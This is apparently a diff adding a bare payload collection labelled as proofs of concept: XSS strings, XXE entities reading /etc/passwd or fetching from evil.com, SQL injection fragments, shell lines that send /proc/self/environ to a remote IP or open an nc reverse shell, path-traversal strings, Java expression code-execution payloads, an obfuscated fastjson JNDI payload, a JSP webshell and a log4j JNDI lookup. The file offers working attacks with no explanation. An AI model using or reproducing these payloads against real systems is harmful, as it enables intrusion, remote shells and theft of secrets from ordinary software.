@@ -1,0 +1,64 @@
+# xss poc
+<svg onload=alert(1)>/plugins/servlet/oauth/users/icon
+<body onload=alert('test1')>"
+<script>alert("TEST");</script>'
+'"><script>alert()</script>'
+'?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>'
+# xxe poc
+'<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://host/text.txt" > ] > <foo>&xxe;</foo>'
+'<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
+'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "file:///dev/random">] > <foo>&xxe;</foo>'
+'<?xml version="1.0" ?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+"<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"jar:file:/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd\"> <!ENTITY % queries 'aaa)> <!ENTITY &#x25; file SYSTEM \"http://evil.com\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>"
+!!str | <?xml version="1.0" encoding="ISO-8859-1" ?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>
+!!str | <!DOCTYPE xxe [ <!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/group">]> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"><Request> <EMailAddress>aaaaa</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema> </Request> </Autodiscover>
+!!str | <!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]><userInfo> <firstName>John</firstName> <lastName>&ent;</lastName> </userInfo>
+# sql poc
+=1' and updatexml(1,if('§b§'=substr(`version`(),§1§,1),'~',1),1) #]
+`locate`('a',(select{x table_name}from information_schema#.tables where table_schema=database#() limit 0,1),1)=1
+if(lower(database())>'a',1,0)
+updatexml(1,ELT(database()>'m',CHAR(1111),1),1)
+exclude_consolexs' or database()>'workbench' and '1'='1&range=30&
+d(updatexml(1,concat(0x7e,(select database())),0))","So
+tOrder=and(updatexml(1,concat(1,(select database())),0))&s
+a'and(if(database()='opensearch_vulcan',exp(9999),1))and'1'='"
+=gmt_modified,if(lower(database())='xxxx',sleep(0.4),1)
+j' or lower(current_database())>'asasa' or 1=1*1e129999*1e10000 or 1=1 or  '1'='"
+s' or lower(user())>'asasa' or '1'='",
+t' or lower(database())='sasasa' or '1'='
+"and(updatexml(1,concat(0x7e,(select database())),0))"
+et'>char(if(lower(database())='vaaap',1,2*1e308))||'1"
+"case when 1  like 1 then ssss else 1/0 end"],
+1) and lower(current_database())='asas' and  (1=1&
+d,(select*from(select(sleep(5)))a)"
+,(select*from(select(sleep(10)))a)
+q' or 1=(updatexml(1,concat(0x7e,(select database())),0)) or '1'='\"
+xs' or database()='sss' and '1'='1
+112-ascii(substr(current_database(),1,1))
+921) and lower(current_database())='asas' and (1=
+c,1=case when 1 like case when(ascii(substr((select count(*) from test limit 0,1),1,1))>1) then 1 else exp(1111111)end then 1 else exp(11111)end
+,if((1=(ascii(substr((select 1 from ss limit 0,1),1,1))>1)),
+ime,1 rlike case when left/*§aaaa§*/(current_user,1)='§1§' then 1 else (SELECT 2256 UNION SELECT 3231) end
+y') AND (SELECT QUARTER(NULL)) IS NULL AND (user() LIKE 'asaa@11.%<@/urlencode>&param.store_code=OMS-LAZ
+st[select]=extractvalue(1,concat(0x7e,(select md5(209919727)),0x7e)
+# bash rce poc
+;curl -vvv 1.1.1.1:23333 -F \\\"file=@\/proc\/self\/environ\\\";\
+; rm/tmp/f; mkfifo/tmp/f; cat /tmp/f|/bin/sh-i2>&1|nc 192.118.80.30 443 >/tmp/f
+;echo "Y2F0IGZsYWc="|base64 -d|bash
+# path-traversal poc
+'/static/img/../../etc/passwd'
+'.../.../WINDOWS/win.ini'
+'../../../../usr/lib/libc.so.6'
+'/src/../WEB-INF/web.xml'
+# code exec poc
+new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
+${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))
+redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()
+login.do?message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())
+<spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}"></spring:message>
+#fastjson  poc
+59&comm={"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"rmi://1.kfm3rdhc.3j1g6g.dnslog.cn/miao2","autoCommit":true}}
+#webshell poc
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+#log4j
+${jndi:ldap://172.16.238.11:1389/a}
